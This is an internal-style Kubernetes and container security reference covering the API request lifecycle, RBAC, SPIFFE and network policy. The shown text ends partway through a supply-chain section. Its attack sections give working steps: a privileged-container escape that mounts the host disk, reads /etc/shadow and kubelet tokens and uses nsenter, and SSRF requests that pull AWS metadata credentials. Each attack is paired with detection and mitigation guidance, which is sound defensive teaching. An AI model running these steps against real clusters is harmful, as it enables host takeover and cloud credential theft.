# Container & Kubernetes Security: Deep Engineering & Security Breakdown

> **Document Type:** Internal Security Architecture / Engineering Reference  
> **Classification:** Internal — Platform Security, Infrastructure Engineering, Red Team  
> **Scope:** End-to-end system — container runtime to control plane, pod escape to supply chain  
> **Audience:** Security engineers, platform engineers, SREs, interview candidates  

---

## Table of Contents

1. [Request/Execution Lifecycle](#1-requestexecution-lifecycle)
2. [Control Plane vs Data Plane Architecture](#2-control-plane-vs-data-plane-architecture)
3. [Identity & Access Management Flow](#3-identity--access-management-flow)
4. [Core System Mechanics](#4-core-system-mechanics)
5. [Attack Mechanics](#5-attack-mechanics)
6. [Security Controls & Defensive Mechanics](#6-security-controls--defensive-mechanics)
7. [Attack Surface Mapping](#7-attack-surface-mapping)
8. [Failure Modes & Edge Cases](#8-failure-modes--edge-cases)
9. [Mitigations & Observability](#9-mitigations--observability)
10. [Interview Questions](#10-interview-questions)

---

## 1. Request/Execution Lifecycle

### The Story: Developer Deploys a New Application to Kubernetes

This traces the full lifecycle of `kubectl apply -f deployment.yaml` from developer's terminal to running containers, covering every decision gate.

---

**T=0ms — Developer Runs kubectl apply**

```
$ kubectl apply -f payment-api-deployment.yaml
```

`kubectl` reads `~/.kube/config`, extracts:
- `server: https://api.k8s.prod.corp:6443`
- `certificate-authority-data: <base64-CA-cert>`
- `client-certificate-data: <base64-dev-cert>`
- `client-key-data: <base64-dev-key>`

kubectl serializes the YAML to JSON and constructs an HTTP request:
```
POST /apis/apps/v1/namespaces/payments/deployments HTTP/2
Host: api.k8s.prod.corp:6443
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6...
(or mutual TLS with client cert — depends on auth mode)

{
  "apiVersion": "apps/v1",
  "kind": "Deployment",
  "metadata": {"name": "payment-api", "namespace": "payments"},
  "spec": {
    "replicas": 3,
    "template": {
      "spec": {
        "containers": [{
          "name": "payment-api",
          "image": "registry.corp.com/payments/api:v1.2.3",
          ...
        }]
      }
    }
  }
}
```

**T=5ms — API Server Receives Request**

The kube-apiserver receives the TLS-encrypted request. It runs through its admission chain synchronously — each step must complete before the next:

**Step 1: Authentication (AuthN)**
The API server tries each configured authenticator in order:
1. Client certificate check: is the TLS client cert signed by a trusted CA? Subject: `CN=alice,O=developers`
2. Bearer token check: if JWT, verify signature against service account key
3. OIDC: if configured, verify token against IdP JWKS endpoint
4. If none match: return 401 Unauthorized

On success: the API server knows WHO is making the request — `alice` in group `developers`.

**Step 2: Authorization (AuthZ) — RBAC**
kube-apiserver evaluates RBAC rules:
- Verb: `create`
- Resource: `deployments`
- Namespace: `payments`
- User: `alice`, Groups: `["developers", "system:authenticated"]`

It evaluates all ClusterRoles and Roles bound to alice's user/groups. If ANY binding grants `create` on `deployments` in namespace `payments`: ALLOWED. If none match: return 403 Forbidden.

**Step 3: Admission Controllers (The Security Gatekeepers)**

Admission controllers run in two phases:

*Mutating Admission Webhooks (run first, can modify the object)*:
- `DefaultStorageClass`: injects default storage class if none specified
- `PodSecurityAdmission` (mutating): may inject security defaults
- `Istio mutating webhook` (if deployed): injects sidecar proxy container
- Custom webhook: inject Vault Agent sidecar

Each webhook receives the full object via HTTPS POST to the webhook server. The webhook can return a modified JSON patch:
```json
{
  "response": {
    "allowed": true,
    "patch": "[{\"op\":\"add\",\"path\":\"/spec/template/spec/containers/-\",\"value\":{\"name\":\"istio-proxy\",...}}]",
    "patchType": "JSONPatch"
  }
}
```

*Validating Admission Webhooks (run second, cannot modify)*:
- `OPA/Gatekeeper`: evaluates Rego policies
  - "All containers must have resource limits"
  - "Image must come from `registry.corp.com/`"
  - "Must not use `hostNetwork: true`"
- `PodSecurity`: enforces Pod Security Standards
- Custom security policy: "No privileged containers in namespace `payments`"

If ANY validating webhook returns `allowed: false`, the entire request is rejected:
```json
{
  "response": {
    "allowed": false,
    "status": {
      "message": "Image 'ubuntu:latest' is not from an approved registry"
    }
  }
}
```

**T=50ms — etcd Write**

If all admission controllers pass, the API server writes the Deployment object to etcd:
- etcd is a distributed key-value store using the Raft consensus algorithm
- Write requires quorum acknowledgment from (n/2+1) etcd members
- Data is stored encrypted at rest (if EncryptionConfig is set — not by default!)
- Key: `/registry/apps/v1/deployments/payments/payment-api`

**T=55ms — API Server Returns Success**

```
HTTP/2 201 Created
Content-Type: application/json
{
  "kind": "Deployment",
  "metadata": {
    "name": "payment-api",
    "resourceVersion": "847291",
    "uid": "a1b2c3d4-..."
  }
}
```

**T=55ms — Controllers Begin Work (Watch-based Reconciliation)**

The Deployment controller in kube-controller-manager has a **watch** open on the API server. It receives a `ADDED` event for the new Deployment object. The controller reconciliation loop:
1. Reads current state: 0 ReplicaSets matching this Deployment's template hash
2. Desired state: 3 replicas of `payment-api:v1.2.3`
3. Delta: create a new ReplicaSet
4. Creates a ReplicaSet object (another API server write → etcd)
5. ReplicaSet controller sees the new RS, creates 3 Pod objects

**T=100ms — Scheduler Assigns Pods to Nodes**

kube-scheduler watches for unscheduled Pods (`spec.nodeName == ""`). For each unscheduled Pod, it runs the scheduling algorithm:

1. **Filtering phase**: eliminate nodes that cannot run this pod:
   - Node doesn't have enough CPU/memory
   - Node has a taint the pod doesn't tolerate
   - PodAffinity/AntiAffinity rules
   - NodeSelector doesn't match

2. **Scoring phase**: rank remaining nodes:
   - LeastRequestedPriority: prefer nodes with more free resources
   - InterPodAffinityPriority: spread pods across zones
   - ImageLocalityPriority: prefer nodes with the image already pulled

3. **Binding**: scheduler writes `spec.nodeName = "node-42"` to the Pod object

**T=110ms — kubelet on node-42 Starts Container**

The kubelet on node-42 watches for pods assigned to it. It sees the new pod and begins container setup:

1. **Volume mounting**: create tmpfs for ServiceAccount token, mount ConfigMaps/Secrets
2. **Image pull**: contact the container registry
   - `POST /v2/auth` → get bearer token
   - `GET /v2/payments/api/manifests/v1.2.3` → get image manifest
   - `GET /v2/payments/api/blobs/<layer-sha256>` → pull each layer
3. **CRI call** (Container Runtime Interface): kubelet calls containerd via gRPC
4. **OCI runtime**: containerd calls `runc` (or gVisor/Kata for isolation)
5. **Namespace setup**: runc creates Linux namespaces (next section)
6. **cgroup assignment**: CPU/memory limits enforced
7. **Container starts**: entrypoint process runs inside the container

**T=300ms — Pod Running, Traffic Can Flow**

The pod reports `Running` status. If readiness probes are configured, the endpoint is not added to the Service until probes pass. Once ready: kube-proxy updates iptables/IPVS rules to route traffic to the new pod.

---

## 2. Control Plane vs Data Plane Architecture

### Control Plane Components

```
KUBERNETES CONTROL PLANE
═══════════════════════════════════════════════════════════════════════════════

┌─────────────────────────────────────────────────────────────────────────────┐
│  CONTROL PLANE NODE(S)                                                      │
│                                                                             │
│  ┌──────────────────────┐  ┌──────────────────────┐                       │
│  │   kube-apiserver     │  │  kube-controller-mgr  │                       │
│  │   :6443 (HTTPS)      │  │  (no exposed port)    │                       │
│  │                      │  │                       │                       │
│  │  - AuthN/AuthZ       │  │  Deployment controller│                       │
│  │  - Admission control │  │  ReplicaSet controller│                       │
│  │  - REST API          │  │  Node controller      │                       │
│  │  - Webhook proxy     │  │  Certificate controller│                      │
│  │  - Audit logging     │  └──────────────────────┘                       │
│  └──────────┬───────────┘                                                  │
│             │ gRPC (TLS)                                                    │
│  ┌──────────▼───────────┐  ┌──────────────────────┐                       │
│  │      etcd            │  │   kube-scheduler      │                       │
│  │      :2379, :2380    │  │   (no exposed port)   │                       │
│  │                      │  │                       │                       │
│  │  - Raft consensus    │  │  Filter → Score → Bind│                       │
│  │  - Encrypted at rest │  │  Pod → Node assignment│                       │
│  │  - Watch API         │  │                       │                       │
│  │  - Single source of  │  └──────────────────────┘                       │
│  │    truth             │                                                   │
│  └──────────────────────┘                                                  │
└─────────────────────────────────────────────────────────────────────────────┘
```

The control plane manages **desired state**. It does NOT carry application traffic. Its job is to ensure the cluster converges toward what was declared in etcd.

### Data Plane Components

```
KUBERNETES DATA PLANE (one per worker node)
═══════════════════════════════════════════════════════════════════════════════

┌─────────────────────────────────────────────────────────────────────────────┐
│  WORKER NODE (node-42)                                                      │
│                                                                             │
│  ┌──────────────────┐  ┌────────────────┐  ┌───────────────────────────┐  │
│  │    kubelet       │  │  kube-proxy    │  │  Container Runtime        │  │
│  │    :10250 (API)  │  │                │  │  (containerd + runc)      │  │
│  │                  │  │  iptables/IPVS │  │                           │  │
│  │  - Pod lifecycle │  │  rules for     │  │  - Image pull/management  │  │
│  │  - Volume mount  │  │  Service VIPs  │  │  - Container start/stop   │  │
│  │  - Health checks │  │                │  │  - OCI spec enforcement   │  │
│  │  - CRI calls     │  │                │  │                           │  │
│  └──────────────────┘  └────────────────┘  └───────────────────────────┘  │
│                                                                             │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │  PODS                                                               │   │
│  │  ┌─────────────────────────────────────────────────────────────┐   │   │
│  │  │  pod: payment-api-7d8f9b-x4k2p                              │   │   │
│  │  │  (pause container) ← shared network namespace              │   │   │
│  │  │  ┌────────────────────┐   ┌──────────────────────────────┐ │   │   │
│  │  │  │  payment-api       │   │  istio-proxy (sidecar)        │ │   │   │
│  │  │  │  cgroup: /pods/...  │   │  Intercepts all traffic      │ │   │   │
│  │  │  │  pid namespace: ✓  │   │  iptables rules in pod ns    │ │   │   │
│  │  │  │  net namespace: ✓  │   └──────────────────────────────┘ │   │   │
│  │  │  │  mnt namespace: ✓  │                                     │   │   │
│  │  │  │  uts namespace: ✓  │                                     │   │   │
│  │  │  └────────────────────┘                                     │   │   │
│  │  └─────────────────────────────────────────────────────────────┘   │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Container Isolation: Linux Namespaces in Detail

A container is fundamentally a **process** with restricted visibility. The restrictions are implemented using Linux kernel namespaces:

| Namespace | Kernel Flag | Isolates | Escape Impact |
|---|---|---|---|
| `pid` | CLONE_NEWPID | Process tree | Cross-container process visibility |
| `net` | CLONE_NEWNET | Network interfaces, routing, iptables | Shared network = no isolation |
| `mnt` | CLONE_NEWNS | Filesystem mount points | / of host if escaped |
| `uts` | CLONE_NEWUTS | Hostname, domain name | Hostname confusion |
| `ipc` | CLONE_NEWIPC | SysV IPC, POSIX message queues | Cross-container IPC |
| `user` | CLONE_NEWUSER | UID/GID mapping | Privilege escalation |
| `cgroup` | CLONE_NEWCGROUP | cgroup root | Resource manipulation |
| `time` | CLONE_NEWTIME | Clock offsets | Time confusion |

**What "sharing" means for security:**

```
hostNetwork: true  → container shares the HOST's net namespace
                     Container can see ALL host network interfaces
                     Can bind to any port
                     Can sniff all node-level traffic
                     
hostPID: true      → container shares HOST's PID namespace
                     Can see ALL processes on the node
                     Can ptrace other processes (including kubelet)
                     Can read /proc/other-pid/mem
                     
hostIPC: true      → can communicate via host IPC mechanisms
                     Can read/write shared memory segments of host processes
```

**cgroup enforcement:**

```
# cgroup hierarchy for a container with limits: 512Mi RAM, 0.5 CPU
/sys/fs/cgroup/
├── kubepods/
│   ├── burstable/
│   │   └── pod-a1b2c3d4/
│   │       ├── payment-api-container/
│   │       │   ├── cpu.cfs_quota_us: 50000   ← 50ms per 100ms = 0.5 CPU
│   │       │   ├── cpu.cfs_period_us: 100000
│   │       │   ├── memory.limit_in_bytes: 536870912  ← 512MB
│   │       │   └── memory.oom_control: ...   ← OOM killer config
```

---

## 3. Identity & Access Management Flow

### Service Account Token Mechanics

Every pod runs with a service account. By default, it's `default` in its namespace. The kubelet automatically mounts a projected ServiceAccount token:

```
PROJECTED SERVICEACCOUNT TOKEN (Kubernetes 1.21+)
─────────────────────────────────────────────────────────────────────────────
Location: /var/run/secrets/kubernetes.io/serviceaccount/token
Type: JSON Web Token (JWT)

Header:
{
  "alg": "RS256",
  "kid": "k8s-sa-signing-key-2024-01"
}

Payload:
{
  "iss": "https://kubernetes.default.svc.cluster.local",
  "sub": "system:serviceaccount:payments:payment-api",
  "aud": ["https://kubernetes.default.svc.cluster.local"],
  "exp": 1716010800,  ← SHORT-LIVED: rotates every hour (kubelet refreshes)
  "iat": 1716007200,
  "kubernetes.io": {
    "namespace": "payments",
    "pod": {
      "name": "payment-api-7d8f9b-x4k2p",
      "uid": "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
    },
    "serviceaccount": {
      "name": "payment-api",
      "uid": "11111111-2222-3333-4444-555555555555"
    },
    "warnafter": 1716007800  ← warn if token is still being used past this
  }
}
```

**Critical evolution**: Old-style static tokens (mounted as Secret, valid forever) are replaced by projected tokens:
- **Time-bound**: expire after 1 hour by default
- **Audience-bound**: `aud` claim limits which services accept the token
- **Pod-bound**: `kubernetes.io.pod.uid` ties the token to a specific pod instance
- **Auto-rotated**: kubelet refreshes before expiry; if the pod has the old token, it's useless

---

### RBAC Architecture

```
RBAC EVALUATION FLOW
═══════════════════════════════════════════════════════════════════════════════

Request: GET /api/v1/namespaces/payments/secrets
Requester: service account "payment-api" in namespace "payments"

RBAC Subject resolution:
  Username: "system:serviceaccount:payments:payment-api"
  Groups: ["system:serviceaccounts", "system:serviceaccounts:payments", 
           "system:authenticated"]

Policy evaluation (ANY match = ALLOW):
  
  Check ClusterRoleBindings:
  ├── binding: payment-api → ClusterRole: view
  │   Rule: GET/LIST/WATCH on pods, services (NOT secrets) → NO MATCH
  │
  └── binding: payment-api → ClusterRole: secret-reader  
      Rule: GET on secrets in ALL namespaces → MATCH → ALLOW
      
  Check RoleBindings in namespace "payments":
  ├── binding: payment-api → Role: payments-secrets-reader
      Rule: GET/LIST on secrets in namespace "payments" → MATCH → ALLOW (redundant)

Final decision: ALLOW

NOTE: RBAC is ADDITIVE only. There is no DENY rule.
If you want to restrict access, you must ensure NO binding grants the permission.
This makes audit complex: you must check ALL bindings to confirm no access.
```

---

### SPIFFE/SPIRE Workload Identity (mTLS Identity)

For service-to-service communication, IP addresses and service accounts are insufficient. SPIFFE provides cryptographic identity.

```
SPIFFE/SPIRE ARCHITECTURE
═══════════════════════════════════════════════════════════════════════════════

SPIRE Server (control plane)              SPIRE Agent (on each node)
┌──────────────────────────────┐          ┌──────────────────────────────┐
│  - Registration entries      │          │  - Node attestation          │
│  - Signing authority (CA)    │          │ - Workload attestation       │
│  - Health checks             │  gRPC    │  - SVIDs issuance            │
│  - Node/workload attestation │◀────────▶│  - Workload API server       │
│    policy                    │          │    (Unix socket: /run/spire/ │
└──────────────────────────────┘          │     agent/agent.sock)        │
                                          └──────────────────────────────┘
                                                        │
                                                        │ Unix socket
                                                        ▼
                                          ┌──────────────────────────────┐
                                          │  Workload (payment-api pod)  │
                                          │                              │
                                          │  Calls SPIRE Workload API:   │
                                          │  FetchX509SVID()             │
                                          │                              │
                                          │  Receives X.509 SVID:        │
                                          │  URI SAN:                    │
                                          │  spiffe://corp.com/           │
                                          │  k8s/payments/payment-api    │
                                          └──────────────────────────────┘

WORKLOAD ATTESTATION FLOW:
  1. payment-api calls FetchX509SVID() on the Workload API Unix socket
  2. SPIRE Agent uses kernel-verified attributes to identify the caller:
     - The calling process's UID/GID (from SO_PEERCRED on Unix socket)
     - The process's cgroup path (matches pod UID in cgroup hierarchy)
     - The process's namespace (PID namespace, network namespace)
  3. Agent queries the kubelet API (or checks local pod info) to map:
     cgroup path → pod UID → service account → SPIFFE ID
  4. Agent verifies with SPIRE Server that this workload has an entry
  5. Agent issues an X.509 SVID:
     - Subject: (empty, trust is via URI SAN)
     - URI SAN: spiffe://corp.com/k8s/payments/payment-api
     - Valid for: 1 hour (short-lived, auto-rotated)
     - Signed by: SPIRE Server's signing CA
  
  SPIFFE ID structure:
  spiffe://{trust-domain}/{workload-path}
  spiffe://corp.com/k8s/payments/payment-api
              │            │           │
              │            │           └── workload identity
              │            └────────────── environment/namespace context
              └─────────────────────────── trust domain (organization)
  
  mTLS with SPIFFE:
    payment-api → order-service:
    TLS handshake: both sides present SPIFFE SVIDs
    Each side verifies: "Is the other's SPIFFE ID in my trust bundle?"
    "Is spiffe://corp.com/k8s/orders/order-service who I expect?"
    ALLOWED if: the calling SPIFFE ID is in the peer's authorization policy
```

---

### IAM Architecture Diagram

```
┌──────────────────────────────────────────────────────────────────────────────────┐
│                    KUBERNETES IDENTITY & ACCESS ARCHITECTURE                     │
└──────────────────────────────────────────────────────────────────────────────────┘

HUMAN USERS                         WORKLOADS                    EXTERNAL SYSTEMS
────────────                        ─────────                    ────────────────
[Developer]                         [Pod: payment-api]           [AWS Services]
    │                                     │                            │
    │ kubectl (kubeconfig)                │ projected SA token         │ IAM Role
    │ client-cert or OIDC token           │ /var/run/secrets/...      │ IRSA (IAM Roles
    │                                     │                            │  for SA)
    ▼                                     ▼                            ▼
┌─────────────────────────────────────────────────────────────────────────────────┐
│                           kube-apiserver :6443                                   │
│                                                                                  │
│  AuthN chain:                                                                    │
│  1. Client certificates (x509)                                                  │
│  2. Bearer token / OIDC (JWT from Okta/Azure AD)                               │
│  3. Webhook token auth (external validator)                                     │
│  4. Service account tokens (k8s-issued JWTs)                                   │
│                                                                                  │
│  AuthZ chain (RBAC):                                                             │
│  ClusterRole/Role ──── ClusterRoleBinding/RoleBinding ──── Subject              │
│  (permissions)         (binding)                           (user/group/SA)      │
└──────────────────────────────┬──────────────────────────────────────────────────┘
                               │
          ┌────────────────────┼────────────────────┐
          ▼                    ▼                     ▼
[Deployment Controller] [ReplicaSet Controller] [Node Controller]
  (system:controller:...)    (uses system SA)    (system:node:...)
  Limited to specific          Minimal perms       Node-level access
  API verbs via default       Required to          only for own node
  ClusterRoles               create pods

          ▼ (inter-service, mTLS)
┌─────────────────────────────────────────────────────────────────────────────────┐
│                         SPIFFE/SPIRE MESH IDENTITY                               │
│                                                                                  │
│  payment-api                order-service                 inventory-service     │
│  spiffe://corp.com/...       spiffe://corp.com/...         spiffe://corp.com/... │
│       │                           │                              │               │
│       └──── Istio mTLS ───────────┘                              │               │
│              (SVID exchange)                                      │               │
│                   │                                               │               │
│                   └──── Authorization Policy ─────────────────────┘               │
│                         "payment-api can call order-service:POST /orders"        │
└─────────────────────────────────────────────────────────────────────────────────┘
```

---

## 4. Core System Mechanics

### Linux Namespaces and Container Runtime Deep Dive

**The `runc` container creation process:**

```c
// Simplified representation of what runc does when creating a container

// 1. Create new namespaces via clone(2)
int pid = clone(
    container_process,          // function to run
    stack + STACK_SIZE,         // stack for new process  
    CLONE_NEWPID |              // new PID namespace
    CLONE_NEWNET |              // new network namespace
    CLONE_NEWNS  |              // new mount namespace
    CLONE_NEWUTS |              // new UTS (hostname) namespace
    CLONE_NEWIPC |              // new IPC namespace
    CLONE_NEWUSER|              // new user namespace (if rootless)
    SIGCHLD,
    &args
);

// 2. Configure network namespace (done by CNI plugin)
// Called by kubelet → containerd → runc → CNI plugin
// CNI plugin: creates veth pair
//   veth0 → attached to container's net namespace
//   eth0  → attached to host bridge (cbr0 or flannel/calico overlay)
// Assigns IP address from the pod CIDR

// 3. Set up cgroup limits (via libcontainer)
write("/sys/fs/cgroup/memory/kubepods/.../memory.limit_in_bytes", "536870912");
write("/sys/fs/cgroup/cpu/kubepods/.../cpu.cfs_quota_us", "50000");

// 4. Configure seccomp profile
// Load BPF filter program that restricts syscalls
struct sock_fprog filter = load_seccomp_profile("runtime-default.json");
prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &filter);

// 5. Drop capabilities
// Default: keep only a minimal set
// Drop: CAP_SYS_ADMIN, CAP_SYS_PTRACE, CAP_NET_ADMIN, etc.
// Keep: CAP_NET_BIND_SERVICE (if needed), CAP_KILL, CAP_SETUID (if needed)

// 6. Apply AppArmor/SELinux label
// If AppArmor: aa_change_profile("container-default")
// If SELinux: setexeccon("container_t:s0:c123,c456")
```

---

### Network Policies: iptables/eBPF Deep Dive

**How Calico implements NetworkPolicy:**

```
NETWORK POLICY ENFORCEMENT (Calico eBPF mode)
═══════════════════════════════════════════════════════════════════════════════

NetworkPolicy YAML:
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: payments-isolation
  namespace: payments
spec:
  podSelector:
    matchLabels: {app: payment-api}
  policyTypes: [Ingress, Egress]
  ingress:
  - from:
    - podSelector: {matchLabels: {app: ingress-nginx}}
    ports: [{port: 8080, protocol: TCP}]
  egress:
  - to:
    - podSelector: {matchLabels: {app: postgres}}
    ports: [{port: 5432, protocol: TCP}]
  - ports: [{port: 53, protocol: UDP}]  # Allow DNS

HOW CALICO ENFORCES THIS:
  
  On each node, Calico watches the Kubernetes API for NetworkPolicy objects.
  When a new policy is created, Calico translates it into eBPF programs
  attached to the pod's network interface.
  
  eBPF program attached to veth for payment-api pod:
  
  // Ingress filter (runs on every packet entering the pod's network namespace)
  // Expressed as eBPF maps + BPF program
  
  INGRESS RULES for pod matching {app: payment-api}:
    IF src_ip IN pods_with_label(app=ingress-nginx):
       AND dst_port == 8080
       AND protocol == TCP:
       → ALLOW
    ELSE:
       → DROP (default deny)
  
  EGRESS RULES:
    IF dst_ip IN pods_with_label(app=postgres):
       AND dst_port == 5432:
       → ALLOW
    IF dst_port == 53 AND protocol == UDP:
       → ALLOW
    ELSE:
       → DROP

IMPORTANT: What NetworkPolicy does NOT cover:
  - Node-to-pod traffic (kubelet health checks bypass NetworkPolicy)
  - Traffic from pods with hostNetwork: true (they're in the host network namespace)
  - Control plane traffic (the API server is not subject to NetworkPolicy)
  - Traffic within the same pod (containers share network namespace)
```

---

### Service Mesh: Istio Sidecar Traffic Interception

```
HOW ISTIO INTERCEPTS TRAFFIC (iptables injection)
═══════════════════════════════════════════════════════════════════════════════

When a pod starts with Istio injection:
  The init container (istio-init) runs BEFORE the app container.
  It configures iptables rules INSIDE the pod's network namespace:
  
  iptables rules installed by istio-init:
  
  # Redirect ALL outbound traffic to Envoy (port 15001)
  iptables -t nat -A OUTPUT -p tcp \
    ! --uid-owner 1337 \          ← except Envoy itself (UID 1337)
    -j REDIRECT --to-port 15001
  
  # Redirect ALL inbound traffic to Envoy (port 15006)
  iptables -t nat -A PREROUTING -p tcp -j REDIRECT --to-port 15006
  
  RESULT:
    App sends: payment-api → order-service:8080
    Kernel intercepts: iptables redirects to Envoy on 15001
    Envoy (as payment-api) gets mTLS cert (SPIFFE SVID)
    Envoy connects to order-service's Envoy: mTLS tunnel
    Other Envoy decrypts, forwards to order-service:8080
    
  The app thinks it's making a plaintext call to port 8080.
  The actual wire traffic is mTLS encrypted.
  The app never handles TLS — Envoy does it transparently.

AUTHORIZATION POLICY (Istio):
  apiVersion: security.istio.io/v1beta1
  kind: AuthorizationPolicy
  metadata:
    name: payment-api-authz
    namespace: payments
  spec:
    selector:
      matchLabels: {app: payment-api}
    rules:
    - from:
      - source:
          principals: ["cluster.local/ns/ingress/sa/nginx-ingress"]
      to:
      - operation:
          methods: ["GET", "POST"]
          paths: ["/api/v1/*"]
  
  This policy is enforced by Envoy sidecar using the SPIFFE identity from mTLS:
  "Only traffic from spiffe://cluster.local/ns/ingress/sa/nginx-ingress
   can reach this pod, and only for GET/POST on /api/v1/* paths."
```

---

## 5. Attack Mechanics

### Attack 1: Container Escape via Privileged Container

**Attacker assumptions:** Gained code execution inside a privileged container (e.g., via RCE in the app, or deployed their own pod with `privileged: true`).

```
PRIVILEGED CONTAINER → FULL HOST COMPROMISE
═══════════════════════════════════════════════════════════════════════════════

WHY PRIVILEGED CONTAINERS ARE DANGEROUS:
  privileged: true = container has ALL capabilities + access to host devices
  It's equivalent to running as root on the host, with namespace boundaries still
  in place — but those boundaries can be easily crossed.

ATTACK STEP 1: Mount the host filesystem
  
  Inside privileged container:
  $ ls /dev/  ← can see ALL host devices (this is the first sign)
  $ mount /dev/sda1 /mnt/hostfs
  
  This works because:
  - Privileged containers have CAP_SYS_ADMIN
  - CAP_SYS_ADMIN allows mount() syscall
  - /dev/sda1 is the host's root disk
  - Container's mount namespace is separate but we just mounted the HOST's disk
  
  Now /mnt/hostfs contains the host's entire filesystem.

ATTACK STEP 2: Read sensitive host files
  
  $ cat /mnt/hostfs/etc/shadow
    root:$6$HASH...:...  ← host root password hash
  
  $ cat /mnt/hostfs/var/lib/kubelet/pods/*/volumes/kubernetes.io~secret/*/token
    eyJhbGciOiJSUzI1NiIsImtpZCI6...  ← ALL service account tokens on this node
  
  The most valuable: find the kubelet's kubeconfig
  $ cat /mnt/hostfs/etc/kubernetes/kubelet.conf
    users:
    - user:
        client-certificate: /var/lib/kubelet/pki/kubelet-client-current.pem
        client-key: /var/lib/kubelet/pki/kubelet-client-current.pem
  
  Copy the kubelet client certificate and key.

ATTACK STEP 3: Use kubelet credentials to hit the API server
  
  $ kubectl --certificate=./kubelet-cert.pem \
            --client-key=./kubelet-key.pem \
            --server=https://api.k8s.prod.corp:6443 \
            get nodes
  
  The kubelet is authorized as: system:node:<nodename>
  This is bound to system:node ClusterRole which allows:
    - Read ANY pod running on that node
    - Read node status
    - Limited write on pods on that node

ATTACK STEP 4: Escape to other pods via chroot
  
  $ chroot /mnt/hostfs /bin/bash
    → Now running as root IN the host filesystem
    → But still in container network namespace... unless:
  
  $ nsenter --target 1 --mount --uts --ipc --net --pid
    ← nsenter switches to PID 1's namespaces (PID 1 = init/systemd on host)
    → Now in ALL host namespaces
    → Full host compromise
  
  $ hostname
  node-42  ← we are now on the host operating system

DETECTION OPPORTUNITIES:
  1. Falco rule: "mount() syscall with source=/dev/* inside container"
  2. Falco rule: "nsenter executed inside container"
  3. Alert: privileged container created (admission webhook should have blocked this)
  4. Alert: /dev access from pod (Falco eBPF monitor)

WHY DEFAULT CONFIG FAILS:
  Default PodSecurityAdmission (since 1.25) is "privileged" for most namespaces.
  Even with "restricted", a misconfigured namespace or a legacy exemption allows it.
  There is no default admission controller that BLOCKS privileged containers.
  You must explicitly configure: PodSecurity, OPA/Gatekeeper, or Kyverno.
```

---

### Attack 2: SSRF to AWS Instance Metadata Service (IMDS)

```
SSRF → AWS IMDS → IAM CREDENTIAL THEFT
═══════════════════════════════════════════════════════════════════════════════

SETUP:
  - Kubernetes cluster running on AWS EC2 nodes
  - Pods running WITHOUT IMDSv2 enforcement
  - Application has an SSRF vulnerability (e.g., fetches arbitrary URLs)
  
  IMDSv1: accessible via simple GET request, no token required
  IMDSv2: requires first obtaining a session token via PUT, then using it
  
  If IMDSv1 is not blocked, any pod can reach 169.254.169.254.

ATTACK STEP 1: Exploit SSRF in the application
  
  Attacker finds: POST /api/webhook
  Body: {"callback_url": "https://legitimate.com/webhook"}
  App fetches: callback_url and posts data there
  
  Attacker sends: {"callback_url": "http://169.254.169.254/latest/meta-data/"}
  App fetches: http://169.254.169.254/latest/meta-data/
  Response returned in body: ami-id, instance-id, iam/...

ATTACK STEP 2: Get the EC2 instance role credentials
  
  Attacker: {"callback_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
  Response: "k8s-node-role"  ← name of the IAM role attached to this EC2 instance
  
  Attacker: {"callback_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/k8s-node-role"}
  Response:
  {
    "AccessKeyId": "ASIAXXX...",
    "SecretAccessKey": "xxxxxxxx...",
    "Token": "IQoJb3JpZ2luX2VjXXXXXXXX...",
    "Expiration": "2024-05-16T03:00:00Z"
  }

ATTACK STEP 3: Use stolen credentials from attacker's machine
  
  export AWS_ACCESS_KEY_ID=ASIAXXX...
  export AWS_SECRET_ACCESS_KEY=xxxxxxxx...
  export AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjXXXXXXXX...
  
  # What can we do? Depends on the EC2 instance role
  aws s3 ls  ← if S3 access: list all buckets, download customer data
  aws ecr describe-repositories  ← if ECR access: pull all container images
  aws secretsmanager list-secrets  ← if SM access: read all secrets
  
  TYPICAL k8s node IAM role (often misconfigured with too much access):
  - ECR: pull images (needed) 
  - S3: list/get on application buckets (often added unnecessarily)
  - SecretsManager: read specific secrets (often wildcard)
  - KMS: decrypt (needed for EBS, accidentally gives too much)
  
  With ECR pull access: pull proprietary container images
  With S3 access: exfiltrate all stored data (customer records, backups)

ATTACK STEP 4 (IRSA exploit): If IRSA is configured
  
  IRSA (IAM Roles for Service Accounts) uses projected tokens with audience=sts.amazonaws.com
  If a pod has an IRSA annotation AND IMDSv2 is not enforced:
  
  The pod's service account token (from /var/run/secrets/...) + IMDS give BOTH:
  - The node's IAM role (broad, node-level access)
  - The pod's IAM role (potentially even more specific but higher-privilege access)

DETECTION:
  1. VPC Flow Logs: traffic to 169.254.169.254 from pod CIDR ranges
  2. CloudTrail: AssumeRoleWithWebIdentity from pod IPs
  3. GuardDuty: "Instance credential exfiltration" finding
  4. Application-level: SSRF detection middleware

WHY THIS WORKS WITHOUT MITIGATIONS:
  IMDSv1 has no authentication. Any HTTP GET from any process on the EC2 instance
  gets the credentials. In a Kubernetes pod, the container shares the node's
  network view for outbound traffic. The IMDS IP 169.254.169.254 is accessible
  from pods unless explicitly blocked.
  
  MITIGATION: IMDSv2 (PUT-first token required) + iptables block:
  iptables -I FORWARD -d 169.254.169.254 -j REJECT
  (add as a DaemonSet that runs on every node)
```

---

### Attack 3: Supply Chain Attack via Compromised Container Image

```
MALICIOUS IMAGE → PRODUCTION COMPROMISE
═══════════════════════════════════════════════════════════════════════════════

ATTACK VECTOR: Typosquatting or compromised base image

Scenario A: Developer uses "ubuntu:ltest" instead of "ubuntu:latest"
  Attacker registered "ubuntu" on a public registry before the real one,
  OR published "ltest" tag with malicious content.

Scenario B: Compromised base image layer
  Developer's Dockerfile:
  FROM python:3.11-slim  ← if attacker compromises this official image
  COPY requirements.txt .
  RUN pip install -r requirements.txt
  COPY app/ .
  CMD ["python", "app.py"]
  
  The malicious layer in python:3.11-slim could:
  - Install a backdoor in /usr/lib/python3.11/
  - Replace common binaries (ls, ps, netstat) with trojans
  - Plant a cron job that phones home
  - Modify /etc/ld.so.preload to load a malicious shared library

Scenario C: Compromised PyPI package in requirements.txt
  requirements.txt:
